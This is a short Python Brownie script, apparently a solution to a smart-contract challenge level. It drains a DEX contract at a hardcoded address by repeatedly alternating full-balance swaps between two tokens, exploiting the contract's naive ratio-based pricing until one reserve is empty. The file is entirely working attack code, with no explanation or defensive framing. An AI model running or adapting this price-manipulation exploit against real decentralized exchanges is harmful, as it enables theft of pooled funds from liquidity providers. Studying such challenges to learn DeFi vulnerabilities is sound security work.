from scripts.helpful_scripts import get_account
from brownie import interface


def main():
    account = get_account()
    dex = interface.Dex("0x21D6539A0B0834F3D61bd6A9C68e2F7bFCC0FeD1")
    token1 = interface.IERC20("0x2dF496fbFc7EA49792AD09e3Aa905cdB4fA7EA84")
    token2 = interface.IERC20("0x943A197b592086691B800fB04c2aF2524Eb7C3dd")

    token1.approve(dex.address, 9999, {"from": account})
    token2.approve(dex.address, 9999, {"from": account})

    # swap token1 if counter is even, token2 otherwise
    swap_counter = 0

    while token1.balanceOf(dex.address) > 0 and token2.balanceOf(dex.address) > 0:
        my_token1_balance = token1.balanceOf(account)
        my_token2_balance = token2.balanceOf(account)

        swap_1_amount = (
            my_token1_balance
            if token1.balanceOf(dex.address) >= my_token1_balance
            else token1.balanceOf(dex.address)
        )
        swap_2_amount = (
            my_token2_balance
            if token2.balanceOf(dex.address) >= my_token2_balance
            else token2.balanceOf(dex.address)
        )

        if swap_counter % 2 == 0:
            tx_swap = dex.swap(
                token1.address, token2.address, swap_1_amount, {"from": account}
            )
            tx_swap.wait(1)
            swap_counter += 1
            print(f"Swapped {swap_1_amount} token1")
        else:
            tx_swap = dex.swap(
                token2.address, token1.address, swap_2_amount, {"from": account}
            )
            tx_swap.wait(1)
            swap_counter += 1
            print(f"Swapped {swap_2_amount} token2")

    print(
        f"Contract has {token1.balanceOf(dex.address)} token1 and {token2.balanceOf(dex.address)} token2 left after {swap_counter} swaps."
    )
